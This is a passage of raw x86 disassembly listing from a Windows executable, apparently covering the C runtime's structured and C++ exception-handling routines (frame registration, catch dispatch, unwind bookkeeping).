  4092d0:	ff 75 0c             	push   0xc(%ebp)
  4092d3:	ff 75 08             	push   0x8(%ebp)
  4092d6:	e8 23 0f 00 00       	call   0x40a1fe
  4092db:	83 c4 20             	add    $0x20,%esp
  4092de:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4092e1:	5f                   	pop    %edi
  4092e2:	5e                   	pop    %esi
  4092e3:	5b                   	pop    %ebx
  4092e4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4092e7:	8b e5                	mov    %ebp,%esp
  4092e9:	5d                   	pop    %ebp
  4092ea:	c3                   	ret
  4092eb:	8b ff                	mov    %edi,%edi
  4092ed:	55                   	push   %ebp
  4092ee:	8b ec                	mov    %esp,%ebp
  4092f0:	56                   	push   %esi
  4092f1:	fc                   	cld
  4092f2:	8b 75 0c             	mov    0xc(%ebp),%esi
  4092f5:	8b 4e 08             	mov    0x8(%esi),%ecx
  4092f8:	33 ce                	xor    %esi,%ecx
  4092fa:	e8 7f 9d ff ff       	call   0x40307e
  4092ff:	6a 00                	push   $0x0
  409301:	56                   	push   %esi
  409302:	ff 76 14             	push   0x14(%esi)
  409305:	ff 76 0c             	push   0xc(%esi)
  409308:	6a 00                	push   $0x0
  40930a:	ff 75 10             	push   0x10(%ebp)
  40930d:	ff 76 10             	push   0x10(%esi)
  409310:	ff 75 08             	push   0x8(%ebp)
  409313:	e8 e6 0e 00 00       	call   0x40a1fe
  409318:	83 c4 20             	add    $0x20,%esp
  40931b:	5e                   	pop    %esi
  40931c:	5d                   	pop    %ebp
  40931d:	c3                   	ret
  40931e:	8b ff                	mov    %edi,%edi
  409320:	55                   	push   %ebp
  409321:	8b ec                	mov    %esp,%ebp
  409323:	83 ec 38             	sub    $0x38,%esp
  409326:	53                   	push   %ebx
  409327:	81 7d 08 23 01 00 00 	cmpl   $0x123,0x8(%ebp)
  40932e:	75 12                	jne    0x409342
  409330:	b8 c9 93 40 00       	mov    $0x4093c9,%eax
  409335:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409338:	89 01                	mov    %eax,(%ecx)
  40933a:	33 c0                	xor    %eax,%eax
  40933c:	40                   	inc    %eax
  40933d:	e9 b0 00 00 00       	jmp    0x4093f2
  409342:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  409346:	c7 45 dc f5 93 40 00 	movl   $0x4093f5,-0x24(%ebp)
  40934d:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  409352:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  409355:	33 c1                	xor    %ecx,%eax
  409357:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40935a:	8b 45 18             	mov    0x18(%ebp),%eax
  40935d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  409360:	8b 45 0c             	mov    0xc(%ebp),%eax
  409363:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409366:	8b 45 1c             	mov    0x1c(%ebp),%eax
  409369:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40936c:	8b 45 20             	mov    0x20(%ebp),%eax
  40936f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409372:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  409376:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40937a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40937e:	89 65 f4             	mov    %esp,-0xc(%ebp)
  409381:	89 6d f8             	mov    %ebp,-0x8(%ebp)
  409384:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40938a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40938d:	8d 45 d8             	lea    -0x28(%ebp),%eax
  409390:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  409396:	c7 45 c8 01 00 00 00 	movl   $0x1,-0x38(%ebp)
  40939d:	8b 45 08             	mov    0x8(%ebp),%eax
  4093a0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4093a3:	8b 45 10             	mov    0x10(%ebp),%eax
  4093a6:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4093a9:	e8 d7 d2 ff ff       	call   0x406685
  4093ae:	8b 80 80 00 00 00    	mov    0x80(%eax),%eax
  4093b4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4093b7:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4093ba:	50                   	push   %eax
  4093bb:	8b 45 08             	mov    0x8(%ebp),%eax
  4093be:	ff 30                	push   (%eax)
  4093c0:	ff 55 d4             	call   *-0x2c(%ebp)
  4093c3:	59                   	pop    %ecx
  4093c4:	59                   	pop    %ecx
  4093c5:	83 65 c8 00          	andl   $0x0,-0x38(%ebp)
  4093c9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4093cd:	74 17                	je     0x4093e6
  4093cf:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  4093d6:	8b 03                	mov    (%ebx),%eax
  4093d8:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  4093db:	89 03                	mov    %eax,(%ebx)
  4093dd:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  4093e4:	eb 09                	jmp    0x4093ef
  4093e6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4093e9:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4093ef:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4093f2:	5b                   	pop    %ebx
  4093f3:	c9                   	leave
  4093f4:	c3                   	ret
  4093f5:	8b ff                	mov    %edi,%edi
  4093f7:	55                   	push   %ebp
  4093f8:	8b ec                	mov    %esp,%ebp
  4093fa:	51                   	push   %ecx
  4093fb:	53                   	push   %ebx
  4093fc:	fc                   	cld
  4093fd:	8b 45 0c             	mov    0xc(%ebp),%eax
  409400:	8b 48 08             	mov    0x8(%eax),%ecx
  409403:	33 4d 0c             	xor    0xc(%ebp),%ecx
  409406:	e8 73 9c ff ff       	call   0x40307e
  40940b:	8b 45 08             	mov    0x8(%ebp),%eax
  40940e:	8b 40 04             	mov    0x4(%eax),%eax
  409411:	83 e0 66             	and    $0x66,%eax
  409414:	74 11                	je     0x409427
  409416:	8b 45 0c             	mov    0xc(%ebp),%eax
  409419:	c7 40 24 01 00 00 00 	movl   $0x1,0x24(%eax)
  409420:	33 c0                	xor    %eax,%eax
  409422:	40                   	inc    %eax
  409423:	eb 6c                	jmp    0x409491
  409425:	eb 6a                	jmp    0x409491
  409427:	6a 01                	push   $0x1
  409429:	8b 45 0c             	mov    0xc(%ebp),%eax
  40942c:	ff 70 18             	push   0x18(%eax)
  40942f:	8b 45 0c             	mov    0xc(%ebp),%eax
  409432:	ff 70 14             	push   0x14(%eax)
  409435:	8b 45 0c             	mov    0xc(%ebp),%eax
  409438:	ff 70 0c             	push   0xc(%eax)
  40943b:	6a 00                	push   $0x0
  40943d:	ff 75 10             	push   0x10(%ebp)
  409440:	8b 45 0c             	mov    0xc(%ebp),%eax
  409443:	ff 70 10             	push   0x10(%eax)
  409446:	ff 75 08             	push   0x8(%ebp)
  409449:	e8 b0 0d 00 00       	call   0x40a1fe
  40944e:	83 c4 20             	add    $0x20,%esp
  409451:	8b 45 0c             	mov    0xc(%ebp),%eax
  409454:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  409458:	75 0b                	jne    0x409465
  40945a:	ff 75 08             	push   0x8(%ebp)
  40945d:	ff 75 0c             	push   0xc(%ebp)
  409460:	e8 fc fd ff ff       	call   0x409261
  409465:	6a 00                	push   $0x0
  409467:	6a 00                	push   $0x0
  409469:	6a 00                	push   $0x0
  40946b:	6a 00                	push   $0x0
  40946d:	6a 00                	push   $0x0
  40946f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409472:	50                   	push   %eax
  409473:	68 23 01 00 00       	push   $0x123
  409478:	e8 a1 fe ff ff       	call   0x40931e
  40947d:	83 c4 1c             	add    $0x1c,%esp
  409480:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409483:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  409486:	8b 63 1c             	mov    0x1c(%ebx),%esp
  409489:	8b 6b 20             	mov    0x20(%ebx),%ebp
  40948c:	ff e0                	jmp    *%eax
  40948e:	33 c0                	xor    %eax,%eax
  409490:	40                   	inc    %eax
  409491:	5b                   	pop    %ebx
  409492:	c9                   	leave
  409493:	c3                   	ret
  409494:	8b ff                	mov    %edi,%edi
  409496:	55                   	push   %ebp
  409497:	8b ec                	mov    %esp,%ebp
  409499:	51                   	push   %ecx
  40949a:	53                   	push   %ebx
  40949b:	56                   	push   %esi
  40949c:	57                   	push   %edi
  40949d:	8b 7d 08             	mov    0x8(%ebp),%edi
  4094a0:	8b 47 10             	mov    0x10(%edi),%eax
  4094a3:	8b 77 0c             	mov    0xc(%edi),%esi
  4094a6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4094a9:	8b de                	mov    %esi,%ebx
  4094ab:	eb 2b                	jmp    0x4094d8
  4094ad:	83 fe ff             	cmp    $0xffffffff,%esi
  4094b0:	75 05                	jne    0x4094b7
  4094b2:	e8 35 d9 ff ff       	call   0x406dec
  4094b7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4094ba:	4e                   	dec    %esi
  4094bb:	8b c6                	mov    %esi,%eax
  4094bd:	6b c0 14             	imul   $0x14,%eax,%eax
  4094c0:	03 45 fc             	add    -0x4(%ebp),%eax
  4094c3:	39 48 04             	cmp    %ecx,0x4(%eax)
  4094c6:	7d 05                	jge    0x4094cd
  4094c8:	3b 48 08             	cmp    0x8(%eax),%ecx
  4094cb:	7e 05                	jle    0x4094d2
  4094cd:	83 fe ff             	cmp    $0xffffffff,%esi
  4094d0:	75 09                	jne    0x4094db
  4094d2:	ff 4d 0c             	decl   0xc(%ebp)
  4094d5:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4094d8:	89 75 08             	mov    %esi,0x8(%ebp)
  4094db:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4094df:	7d cc                	jge    0x4094ad
  4094e1:	8b 45 14             	mov    0x14(%ebp),%eax
  4094e4:	46                   	inc    %esi
  4094e5:	89 30                	mov    %esi,(%eax)
  4094e7:	8b 45 18             	mov    0x18(%ebp),%eax
  4094ea:	89 18                	mov    %ebx,(%eax)
  4094ec:	3b 5f 0c             	cmp    0xc(%edi),%ebx
  4094ef:	77 04                	ja     0x4094f5
  4094f1:	3b f3                	cmp    %ebx,%esi
  4094f3:	76 05                	jbe    0x4094fa
  4094f5:	e8 f2 d8 ff ff       	call   0x406dec
  4094fa:	8b c6                	mov    %esi,%eax
  4094fc:	6b c0 14             	imul   $0x14,%eax,%eax
  4094ff:	03 45 fc             	add    -0x4(%ebp),%eax
  409502:	5f                   	pop    %edi
  409503:	5e                   	pop    %esi
  409504:	5b                   	pop    %ebx
  409505:	c9                   	leave
  409506:	c3                   	ret
  409507:	8b ff                	mov    %edi,%edi
  409509:	55                   	push   %ebp
  40950a:	8b ec                	mov    %esp,%ebp
  40950c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40950f:	56                   	push   %esi
  409510:	8b 75 08             	mov    0x8(%ebp),%esi
  409513:	89 06                	mov    %eax,(%esi)
  409515:	e8 6b d1 ff ff       	call   0x406685
  40951a:	8b 80 98 00 00 00    	mov    0x98(%eax),%eax
  409520:	89 46 04             	mov    %eax,0x4(%esi)
  409523:	e8 5d d1 ff ff       	call   0x406685
  409528:	89 b0 98 00 00 00    	mov    %esi,0x98(%eax)
  40952e:	8b c6                	mov    %esi,%eax
  409530:	5e                   	pop    %esi
  409531:	5d                   	pop    %ebp
  409532:	c3                   	ret
  409533:	8b ff                	mov    %edi,%edi
  409535:	55                   	push   %ebp
  409536:	8b ec                	mov    %esp,%ebp
  409538:	e8 48 d1 ff ff       	call   0x406685
  40953d:	8b 80 98 00 00 00    	mov    0x98(%eax),%eax
  409543:	eb 0a                	jmp    0x40954f
  409545:	8b 08                	mov    (%eax),%ecx
  409547:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  40954a:	74 0a                	je     0x409556
  40954c:	8b 40 04             	mov    0x4(%eax),%eax
  40954f:	85 c0                	test   %eax,%eax
  409551:	75 f2                	jne    0x409545
  409553:	40                   	inc    %eax
  409554:	5d                   	pop    %ebp
  409555:	c3                   	ret
  409556:	33 c0                	xor    %eax,%eax
  409558:	5d                   	pop    %ebp
  409559:	c3                   	ret
  40955a:	8b ff                	mov    %edi,%edi
  40955c:	55                   	push   %ebp
  40955d:	8b ec                	mov    %esp,%ebp
  40955f:	56                   	push   %esi
  409560:	e8 20 d1 ff ff       	call   0x406685
  409565:	8b 75 08             	mov    0x8(%ebp),%esi
  409568:	3b b0 98 00 00 00    	cmp    0x98(%eax),%esi
  40956e:	75 11                	jne    0x409581
  409570:	e8 10 d1 ff ff       	call   0x406685
  409575:	8b 4e 04             	mov    0x4(%esi),%ecx
  409578:	89 88 98 00 00 00    	mov    %ecx,0x98(%eax)
  40957e:	5e                   	pop    %esi
  40957f:	5d                   	pop    %ebp
  409580:	c3                   	ret
  409581:	e8 ff d0 ff ff       	call   0x406685
  409586:	8b 80 98 00 00 00    	mov    0x98(%eax),%eax
  40958c:	eb 09                	jmp    0x409597
  40958e:	8b 48 04             	mov    0x4(%eax),%ecx
  409591:	3b f1                	cmp    %ecx,%esi
  409593:	74 0f                	je     0x4095a4
  409595:	8b c1                	mov    %ecx,%eax
  409597:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40959b:	75 f1                	jne    0x40958e
  40959d:	5e                   	pop    %esi
  40959e:	5d                   	pop    %ebp
  40959f:	e9 48 d8 ff ff       	jmp    0x406dec
  4095a4:	8b 4e 04             	mov    0x4(%esi),%ecx
  4095a7:	89 48 04             	mov    %ecx,0x4(%eax)
  4095aa:	eb d2                	jmp    0x40957e
  4095ac:	8b ff                	mov    %edi,%edi
  4095ae:	55                   	push   %ebp
  4095af:	8b ec                	mov    %esp,%ebp
  4095b1:	83 ec 18             	sub    $0x18,%esp
  4095b4:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4095b9:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
  4095bd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4095c0:	33 c1                	xor    %ecx,%eax
  4095c2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4095c5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4095c8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4095cb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4095ce:	8b 45 14             	mov    0x14(%ebp),%eax
  4095d1:	40                   	inc    %eax
  4095d2:	c7 45 ec eb 92 40 00 	movl   $0x4092eb,-0x14(%ebp)
  4095d9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4095dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4095df:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4095e5:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4095e8:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4095eb:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4095f1:	ff 75 18             	push   0x18(%ebp)
  4095f4:	51                   	push   %ecx
  4095f5:	ff 75 10             	push   0x10(%ebp)
  4095f8:	e8 f3 0c 00 00       	call   0x40a2f0
  4095fd:	8b c8                	mov    %eax,%ecx
  4095ff:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409602:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  409608:	8b c1                	mov    %ecx,%eax
  40960a:	c9                   	leave
  40960b:	c3                   	ret
  40960c:	c7 01 2c d4 40 00    	movl   $0x40d42c,(%ecx)
  409612:	e9 20 9c ff ff       	jmp    0x403237
  409617:	8b ff                	mov    %edi,%edi
  409619:	55                   	push   %ebp
  40961a:	8b ec                	mov    %esp,%ebp
  40961c:	56                   	push   %esi
  40961d:	8b f1                	mov    %ecx,%esi
  40961f:	c7 06 2c d4 40 00    	movl   $0x40d42c,(%esi)
  409625:	e8 0d 9c ff ff       	call   0x403237
  40962a:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40962e:	74 07                	je     0x409637
  409630:	56                   	push   %esi
  409631:	e8 3d 9a ff ff       	call   0x403073
  409636:	59                   	pop    %ecx
  409637:	8b c6                	mov    %esi,%eax
  409639:	5e                   	pop    %esi
  40963a:	5d                   	pop    %ebp
  40963b:	c2 04 00             	ret    $0x4
  40963e:	8b ff                	mov    %edi,%edi
  409640:	55                   	push   %ebp
  409641:	8b ec                	mov    %esp,%ebp
  409643:	56                   	push   %esi
  409644:	57                   	push   %edi
  409645:	8b 7d 08             	mov    0x8(%ebp),%edi
  409648:	8b 47 04             	mov    0x4(%edi),%eax
  40964b:	85 c0                	test   %eax,%eax
  40964d:	74 47                	je     0x409696
  40964f:	8d 50 08             	lea    0x8(%eax),%edx
  409652:	80 3a 00             	cmpb   $0x0,(%edx)
  409655:	74 3f                	je     0x409696
  409657:	8b 75 0c             	mov    0xc(%ebp),%esi
  40965a:	8b 4e 04             	mov    0x4(%esi),%ecx
  40965d:	3b c1                	cmp    %ecx,%eax
  40965f:	74 14                	je     0x409675
  409661:	83 c1 08             	add    $0x8,%ecx
  409664:	51                   	push   %ecx
  409665:	52                   	push   %edx
  409666:	e8 05 ad ff ff       	call   0x404370
  40966b:	59                   	pop    %ecx
  40966c:	59                   	pop    %ecx
  40966d:	85 c0                	test   %eax,%eax
  40966f:	74 04                	je     0x409675
  409671:	33 c0                	xor    %eax,%eax
  409673:	eb 24                	jmp    0x409699
  409675:	f6 06 02             	testb  $0x2,(%esi)
  409678:	74 05                	je     0x40967f
  40967a:	f6 07 08             	testb  $0x8,(%edi)
  40967d:	74 f2                	je     0x409671
  40967f:	8b 45 10             	mov    0x10(%ebp),%eax
  409682:	8b 00                	mov    (%eax),%eax
  409684:	a8 01                	test   $0x1,%al
  409686:	74 05                	je     0x40968d
  409688:	f6 07 01             	testb  $0x1,(%edi)
  40968b:	74 e4                	je     0x409671
  40968d:	a8 02                	test   $0x2,%al
  40968f:	74 05                	je     0x409696
  409691:	f6 07 02             	testb  $0x2,(%edi)
  409694:	74 db                	je     0x409671
  409696:	33 c0                	xor    %eax,%eax
  409698:	40                   	inc    %eax
  409699:	5f                   	pop    %edi
  40969a:	5e                   	pop    %esi
  40969b:	5d                   	pop    %ebp
  40969c:	c3                   	ret
  40969d:	8b ff                	mov    %edi,%edi
  40969f:	55                   	push   %ebp
  4096a0:	8b ec                	mov    %esp,%ebp
  4096a2:	8b 45 08             	mov    0x8(%ebp),%eax
  4096a5:	8b 00                	mov    (%eax),%eax
  4096a7:	8b 00                	mov    (%eax),%eax
  4096a9:	3d 52 43 43 e0       	cmp    $0xe0434352,%eax
  4096ae:	74 1f                	je     0x4096cf
  4096b0:	3d 4d 4f 43 e0       	cmp    $0xe0434f4d,%eax
  4096b5:	74 18                	je     0x4096cf
  4096b7:	3d 63 73 6d e0       	cmp    $0xe06d7363,%eax
  4096bc:	75 2a                	jne    0x4096e8
  4096be:	e8 c2 cf ff ff       	call   0x406685
  4096c3:	83 a0 90 00 00 00 00 	andl   $0x0,0x90(%eax)
  4096ca:	e9 d1 d6 ff ff       	jmp    0x406da0
  4096cf:	e8 b1 cf ff ff       	call   0x406685
  4096d4:	83 b8 90 00 00 00 00 	cmpl   $0x0,0x90(%eax)
  4096db:	7e 0b                	jle    0x4096e8
  4096dd:	e8 a3 cf ff ff       	call   0x406685
  4096e2:	ff 88 90 00 00 00    	decl   0x90(%eax)
  4096e8:	33 c0                	xor    %eax,%eax
  4096ea:	5d                   	pop    %ebp
  4096eb:	c3                   	ret
  4096ec:	6a 10                	push   $0x10
  4096ee:	68 f0 dc 40 00       	push   $0x40dcf0
  4096f3:	e8 d8 b3 ff ff       	call   0x404ad0
  4096f8:	8b 7d 10             	mov    0x10(%ebp),%edi
  4096fb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4096fe:	81 7f 04 80 00 00 00 	cmpl   $0x80,0x4(%edi)
  409705:	7f 06                	jg     0x40970d
  409707:	0f be 73 08          	movsbl 0x8(%ebx),%esi
  40970b:	eb 03                	jmp    0x409710
  40970d:	8b 73 08             	mov    0x8(%ebx),%esi
  409710:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409713:	e8 6d cf ff ff       	call   0x406685
  409718:	ff 80 90 00 00 00    	incl   0x90(%eax)
  40971e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409722:	3b 75 14             	cmp    0x14(%ebp),%esi
  409725:	74 62                	je     0x409789
  409727:	83 fe ff             	cmp    $0xffffffff,%esi
  40972a:	7e 05                	jle    0x409731
  40972c:	3b 77 04             	cmp    0x4(%edi),%esi
  40972f:	7c 05                	jl     0x409736
  409731:	e8 b6 d6 ff ff       	call   0x406dec
  409736:	8b c6                	mov    %esi,%eax
  409738:	8b 4f 08             	mov    0x8(%edi),%ecx
  40973b:	8b 34 c1             	mov    (%ecx,%eax,8),%esi
  40973e:	89 75 e0             	mov    %esi,-0x20(%ebp)
  409741:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409748:	83 7c c1 04 00       	cmpl   $0x0,0x4(%ecx,%eax,8)
  40974d:	74 15                	je     0x409764
  40974f:	89 73 08             	mov    %esi,0x8(%ebx)
  409752:	68 03 01 00 00       	push   $0x103
  409757:	53                   	push   %ebx
  409758:	8b 4f 08             	mov    0x8(%edi),%ecx
  40975b:	ff 74 c1 04          	push   0x4(%ecx,%eax,8)
  40975f:	e8 8c 0b 00 00       	call   0x40a2f0
  409764:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409768:	eb 1a                	jmp    0x409784
  40976a:	ff 75 ec             	push   -0x14(%ebp)
  40976d:	e8 2b ff ff ff       	call   0x40969d
  409772:	59                   	pop    %ecx
  409773:	c3                   	ret
  409774:	8b 65 e8             	mov    -0x18(%ebp),%esp
  409777:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40977b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40977e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  409781:	8b 75 e0             	mov    -0x20(%ebp),%esi
  409784:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409787:	eb 99                	jmp    0x409722
  409789:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409790:	e8 19 00 00 00       	call   0x4097ae
  409795:	3b 75 14             	cmp    0x14(%ebp),%esi
  409798:	74 05                	je     0x40979f
  40979a:	e8 4d d6 ff ff       	call   0x406dec
  40979f:	89 73 08             	mov    %esi,0x8(%ebx)
  4097a2:	e8 6e b3 ff ff       	call   0x404b15
  4097a7:	c3                   	ret
  4097a8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4097ab:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4097ae:	e8 d2 ce ff ff       	call   0x406685
  4097b3:	83 b8 90 00 00 00 00 	cmpl   $0x0,0x90(%eax)
  4097ba:	7e 0b                	jle    0x4097c7
  4097bc:	e8 c4 ce ff ff       	call   0x406685
  4097c1:	ff 88 90 00 00 00    	decl   0x90(%eax)
  4097c7:	c3                   	ret
  4097c8:	8b 00                	mov    (%eax),%eax
  4097ca:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4097d0:	75 38                	jne    0x40980a
  4097d2:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  4097d6:	75 32                	jne    0x40980a
  4097d8:	8b 48 14             	mov    0x14(%eax),%ecx
  4097db:	81 f9 20 05 93 19    	cmp    $0x19930520,%ecx
  4097e1:	74 10                	je     0x4097f3
  4097e3:	81 f9 21 05 93 19    	cmp    $0x19930521,%ecx
  4097e9:	74 08                	je     0x4097f3
  4097eb:	81 f9 22 05 93 19    	cmp    $0x19930522,%ecx
  4097f1:	75 17                	jne    0x40980a
  4097f3:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  4097f7:	75 11                	jne    0x40980a
  4097f9:	e8 87 ce ff ff       	call   0x406685
  4097fe:	33 c9                	xor    %ecx,%ecx
  409800:	41                   	inc    %ecx
  409801:	89 88 0c 02 00 00    	mov    %ecx,0x20c(%eax)
  409807:	8b c1                	mov    %ecx,%eax
  409809:	c3                   	ret
  40980a:	33 c0                	xor    %eax,%eax
  40980c:	c3                   	ret
  40980d:	6a 08                	push   $0x8
  40980f:	68 18 dd 40 00       	push   $0x40dd18
  409814:	e8 b7 b2 ff ff       	call   0x404ad0
  409819:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40981c:	85 c9                	test   %ecx,%ecx
  40981e:	74 2a                	je     0x40984a
  409820:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  409826:	75 22                	jne    0x40984a
  409828:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40982b:	85 c0                	test   %eax,%eax
  40982d:	74 1b                	je     0x40984a
  40982f:	8b 40 04             	mov    0x4(%eax),%eax
  409832:	85 c0                	test   %eax,%eax
  409834:	74 14                	je     0x40984a
  409836:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40983a:	50                   	push   %eax
  40983b:	ff 71 18             	push   0x18(%ecx)
  40983e:	e8 17 fa ff ff       	call   0x40925a
  409843:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40984a:	e8 c6 b2 ff ff       	call   0x404b15
  40984f:	c3                   	ret
  409850:	33 c0                	xor    %eax,%eax
  409852:	38 45 0c             	cmp    %al,0xc(%ebp)
  409855:	0f 95 c0             	setne  %al
  409858:	c3                   	ret
  409859:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40985c:	e8 3f d5 ff ff       	call   0x406da0
  409861:	cc                   	int3
  409862:	8b ff                	mov    %edi,%edi
  409864:	55                   	push   %ebp
  409865:	8b ec                	mov    %esp,%ebp
  409867:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40986a:	8b 01                	mov    (%ecx),%eax
  40986c:	56                   	push   %esi
  40986d:	8b 75 08             	mov    0x8(%ebp),%esi
  409870:	03 c6                	add    %esi,%eax
  409872:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  409876:	7c 10                	jl     0x409888
  409878:	8b 51 04             	mov    0x4(%ecx),%edx
  40987b:	8b 49 08             	mov    0x8(%ecx),%ecx
  40987e:	8b 34 32             	mov    (%edx,%esi,1),%esi
  409881:	8b 0c 0e             	mov    (%esi,%ecx,1),%ecx
  409884:	03 ca                	add    %edx,%ecx
  409886:	03 c1                	add    %ecx,%eax
  409888:	5e                   	pop    %esi
  409889:	5d                   	pop    %ebp
  40988a:	c3                   	ret
  40988b:	8b ff                	mov    %edi,%edi
  40988d:	55                   	push   %ebp
  40988e:	8b ec                	mov    %esp,%ebp
  409890:	33 c0                	xor    %eax,%eax
  409892:	83 ec 0c             	sub    $0xc,%esp
  409895:	3b f8                	cmp    %eax,%edi
  409897:	75 0a                	jne    0x4098a3
  409899:	e8 4e d5 ff ff       	call   0x406dec
  40989e:	e8 fd d4 ff ff       	call   0x406da0
  4098a3:	88 45 ff             	mov    %al,-0x1(%ebp)
  4098a6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4098a9:	39 07                	cmp    %eax,(%edi)
  4098ab:	7e 4f                	jle    0x4098fc
  4098ad:	53                   	push   %ebx
  4098ae:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4098b1:	56                   	push   %esi
  4098b2:	8b 45 08             	mov    0x8(%ebp),%eax
  4098b5:	8b 40 1c             	mov    0x1c(%eax),%eax
  4098b8:	8b 40 0c             	mov    0xc(%eax),%eax
  4098bb:	8b 18                	mov    (%eax),%ebx
  4098bd:	8d 70 04             	lea    0x4(%eax),%esi
  4098c0:	eb 20                	jmp    0x4098e2
  4098c2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4098c5:	ff 71 1c             	push   0x1c(%ecx)
  4098c8:	8b 06                	mov    (%esi),%eax
  4098ca:	50                   	push   %eax
  4098cb:	8b 47 04             	mov    0x4(%edi),%eax
  4098ce:	03 45 f8             	add    -0x8(%ebp),%eax
  4098d1:	50                   	push   %eax
  4098d2:	e8 67 fd ff ff       	call   0x40963e
  4098d7:	83 c4 0c             	add    $0xc,%esp
  4098da:	85 c0                	test   %eax,%eax
  4098dc:	75 0a                	jne    0x4098e8
  4098de:	4b                   	dec    %ebx
  4098df:	83 c6 04             	add    $0x4,%esi
  4098e2:	85 db                	test   %ebx,%ebx
  4098e4:	7f dc                	jg     0x4098c2
  4098e6:	eb 04                	jmp    0x4098ec
  4098e8:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  4098ec:	ff 45 f4             	incl   -0xc(%ebp)
  4098ef:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4098f2:	83 45 f8 10          	addl   $0x10,-0x8(%ebp)
  4098f6:	3b 07                	cmp    (%edi),%eax
  4098f8:	7c b8                	jl     0x4098b2
  4098fa:	5e                   	pop    %esi
  4098fb:	5b                   	pop    %ebx
  4098fc:	8a 45 ff             	mov    -0x1(%ebp),%al
  4098ff:	c9                   	leave
  409900:	c3                   	ret
  409901:	6a 04                	push   $0x4
  409903:	b8 c0 a4 40 00       	mov    $0x40a4c0,%eax
  409908:	e8 2f 0a 00 00       	call   0x40a33c
  40990d:	e8 73 cd ff ff       	call   0x406685
  409912:	83 b8 94 00 00 00 00 	cmpl   $0x0,0x94(%eax)
  409919:	74 05                	je     0x409920
  40991b:	e8 cc d4 ff ff       	call   0x406dec
  409920:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409924:	e8 b0 d4 ff ff       	call   0x406dd9
  409929:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40992d:	e8 6e d4 ff ff       	call   0x406da0
  409932:	e8 4e cd ff ff       	call   0x406685
